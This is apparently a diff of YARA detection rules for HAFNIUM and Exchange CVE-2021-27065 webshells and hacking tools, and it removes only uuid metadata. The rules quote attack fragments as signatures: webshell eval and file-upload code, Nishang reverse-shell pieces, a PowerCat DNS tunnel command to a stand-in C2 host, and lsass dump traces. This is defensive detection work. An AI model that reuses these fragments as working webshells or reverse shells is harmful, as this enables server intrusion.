@@ -6,7 +6,6 @@ rule WEBSHELL_ASP_Embedded_Mar21_1 {
       reference = "Internal Research"
       date = "2021-03-05"
       score = 85
-      uuid = "7cf7db9d-8f8a-51db-a0e6-84748e8f9e1f"
    strings:
       $s1 = "<script runat=\"server\">" nocase
       $s2 = "new System.IO.StreamWriter(Request.Form["
@@ -22,7 +21,6 @@ rule APT_WEBSHELL_HAFNIUM_SecChecker_Mar21_1 {
       reference = "https://twitter.com/markus_neis/status/1367794681237667840"
       date = "2021-03-05"
       hash1 = "b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0"
-      uuid = "73db3d78-7ece-53be-9efb-d19801993d5e"
    strings:
       $x1 = "<%if(System.IO.File.Exists(\"c:\\\\program files (x86)\\\\fireeye\\\\xagt.exe" ascii
       $x2 = "\\csfalconservice.exe\")){Response.Write( \"3\");}%></head>" ascii fullword
@@ -38,7 +36,6 @@ rule APT_HAFNIUM_Forensic_Artefacts_Mar21_1 {
       author = "Florian Roth (Nextron Systems)"
       reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
       date = "2021-03-02"
-      uuid = "872822b0-34d9-5ae4-a532-6a8786494fa9"
    strings:
       $s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
       $s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
@@ -53,7 +50,6 @@ rule APT_WEBSHELL_HAFNIUM_Chopper_WebShell: APT Hafnium WebShell {
       author = "Markus Neis,Swisscom"
       date = "2021-03-05"
       reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
-      uuid = "25dcf166-4aea-5680-b161-c5fc8d74b987"
    strings:
       $x1 = "runat=\"server\">" nocase
 
@@ -71,7 +67,6 @@ rule APT_WEBSHELL_Tiny_WebShell : APT Hafnium WebShell {
       hash = "099c8625c58b315b6c11f5baeb859f4c"
       date = "2021-03-05"
       reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
-      uuid = "aa2fcecc-4c8b-570d-a81a-5dfb16c04e05"
    strings:
       $x1 = "<%@ Page Language=\"Jscript\" Debug=true%>"
 
@@ -88,7 +83,6 @@ rule HKTL_PS1_PowerCat_Mar21 {
       reference = "https://github.com/besimorhino/powercat"
       date = "2021-03-02"
       hash1 = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"
-      uuid = "ae3963e8-2fe9-5bc3-bf72-95f136622832"
    strings:
       $x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
       $x2 = "try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}" ascii fullword
@@ -109,7 +103,6 @@ rule HKTL_Nishang_PS1_Invoke_PowerShellTcpOneLine {
       reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
       date = "2021-03-03"
       hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"
-      uuid = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
    strings:
       $s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
       $s2 = ".GetStream();[byte[]]$" ascii wide
@@ -125,7 +118,6 @@ rule WEBSHELL_ASPX_SimpleSeeSharp : Webshell Unclassified {
       description = "A simple ASPX Webshell that allows an attacker to write further files to disk."
       hash = "893cd3583b49cb706b3e55ecb2ed0757b977a21f5c72e041392d1256f31166e2"
       reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
-      uuid = "469fdf5c-e09e-5d44-a2e6-0864dcd0e18a"
    strings:
       $header = "<%@ Page Language=\"C#\" %>"
       $body = "<% HttpPostedFile thisFile = Request.Files[0];thisFile.SaveAs(Path.Combine"
@@ -142,7 +134,6 @@ rule WEBSHELL_ASPX_reGeorgTunnel : Webshell Commodity {
       description = "variation on reGeorgtunnel"
       hash = "406b680edc9a1bb0e2c7c451c56904857848b5f15570401450b73b232ff38928"
       reference = "https://github.com/sensepost/reGeorg/blob/master/tunnel.aspx"
-      uuid = "b8aa27c9-a28a-5051-8f81-1184f28842ed"
    strings:
       $s1 = "System.Net.Sockets"
       $s2 = "System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get"
@@ -163,7 +154,6 @@ rule WEBSHELL_ASPX_SportsBall {
       description = "The SPORTSBALL webshell allows attackers to upload files or execute commands on the system."
       hash = "2fa06333188795110bba14a482020699a96f76fb1ceb80cbfa2df9d3008b5b0a"
       reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
-      uuid = "25b23a4c-8fc7-5d6f-b4b5-46fe2c1546d8"
    strings:
       $uniq1 = "HttpCookie newcook = new HttpCookie(\"fqrspt\", HttpContext.Current.Request.Form"
       $uniq2 = "ZN2aDAB4rXsszEvCLrzgcvQ4oi5J1TuiRULlQbYwldE="
@@ -185,7 +175,6 @@ rule WEBSHELL_CVE_2021_27065_Webshells {
       author = "Joe Hannon, Microsoft Threat Intelligence Center (MSTIC)"
       date = "2021-03-05"
       reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
-      uuid = "27677f35-24a3-59cc-a3ad-b83884128da7"
    strings:
       $script1 = "script language" ascii wide nocase
       $script2 = "page language" ascii wide nocase
@@ -206,7 +195,6 @@ rule APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_3 {
       reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
       date = "2021-03-07"
       score = 85
-      uuid = "9c2ba123-63c4-5e9c-a08f-bd9db3304691"
    strings:
       $s1 = "runat=\"server\">void Page_Load(object" ascii wide 
       $s2 = "Request.Files[0].SaveAs(Server.MapPath(" ascii wide
@@ -222,7 +210,6 @@ rule APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_4 {
       reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
       date = "2021-03-07"
       score = 85
-      uuid = "93f5b682-642d-5edf-84a9-296bf12cd72b"
    strings:
       $s1 = "<%@Page Language=\"Jscript\"%>" ascii wide nocase
       $s2 = ".FromBase64String(" ascii wide nocase
@@ -239,7 +226,6 @@ rule APT_HAFNIUM_ForensicArtefacts_WER_Mar21_1 {
       reference = "https://twitter.com/cyb3rops/status/1368471533048446976"
       date = "2021-03-07"
       score = 40
-      uuid = "06771101-10ce-5d6b-99f7-a321aade7f69"
    strings:
       $s1 = "AppPath=c:\\windows\\system32\\inetsrv\\w3wp.exe" wide fullword
       $s7 = ".Value=w3wp#MSExchangeECPAppPool" wide
@@ -256,7 +242,6 @@ rule APT_HAFNIUM_ForensicArtefacts_Cab_Recon_Mar21_1 {
       reference = "https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3?u=dstepanic"
       date = "2021-03-11"
       score = 70
-      uuid = "b0caf9d9-af0a-5181-85e4-6091cd6699e3"
    strings:
       $s1 = "ip.txt" ascii fullword
       $s2 = "arp.txt" ascii fullword
@@ -279,7 +264,6 @@ rule WEBSHELL_Compiled_Webshell_Mar2021_1 {
       date = "2021-03-05"
       modified = "2021-03-12"
       reference = "https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/Vorfaelle/Exchange-Schwachstellen-2021/MSExchange_Schwachstelle_Detektion_Reaktion.pdf"
-      uuid = "9336bd2c-791c-5c3e-9733-724a6a23864a"
    strings:
       $x1 = /App_Web_[a-zA-Z0-9]{7,8}.dll/ ascii wide fullword
       $a1 = "~/aspnet_client/" ascii wide nocase
@@ -307,7 +291,6 @@ rule APT_MAL_ASP_DLL_HAFNIUM_Mar21_1 {
       hash4 = "5f0480035ee23a12302c88be10e54bf3adbcf271a4bb1106d4975a28234d3af8"
       hash5 = "6243fd2826c528ee329599153355fd00153dee611ca33ec17effcf00205a6e4e"
       hash6 = "ebf6799bb86f0da2b05e66a0fe5a9b42df6dac848f4b951b2ed7b7a4866f19ef"
-      uuid = "68b8252e-a07d-5507-b556-a4d473f98157"
    strings:
       $s1 = "Page_Load" ascii fullword
       
@@ -332,7 +315,6 @@ rule WEBSHELL_HAFNIUM_CISA_10328929_01 : trojan webshell exploit CVE_2021_27065 
        description = "Detects CVE-2021-27065 Webshellz"
        hash = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
        reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084a"
-       uuid = "81916396-8aaa-5045-b31c-4bcce8d295a5"
    strings:
        $s0 = { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 [1-32] 5D 2C 22 75 6E 73 61 66 65 22 29 }
        $s1 = { 65 76 61 6C 28 }
@@ -350,7 +332,6 @@ rule WEBSHELL_HAFNIUM_CISA_10328929_02 : trojan webshell exploit CVE_2021_27065 
        description = "Detects CVE-2021-27065 Exchange OAB VD MOD"
        hash = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
        reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084a"
-       uuid = "34a89a6e-fa8a-5c64-a325-30202e20b30f"
    strings:
        $s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }
        $s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }
@@ -368,7 +349,6 @@ rule WEBSHELL_ASPX_FileExplorer_Mar21_1 {
       date = "2021-03-31"
       score = 80
       hash1 = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
-      uuid = "edcaa2a8-6fea-584e-90c2-307a2dfc9f7f"
    strings:
       $x1 = "<span style=\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\" onclick=" ascii
       $xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64
@@ -404,7 +384,6 @@ rule WEBSHELL_ASPX_Chopper_Like_Mar21_1 {
       date = "2021-03-31"
       score = 85
       hash1 = "ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90"
-      uuid = "a4dc1880-865f-5e20-89a2-3a642c453ef9"
    strings:
       $s1 = "http://f/<script language=\"JScript\" runat=\"server\">var _0x" ascii
       $s2 = "));function Page_Load(){var _0x" ascii
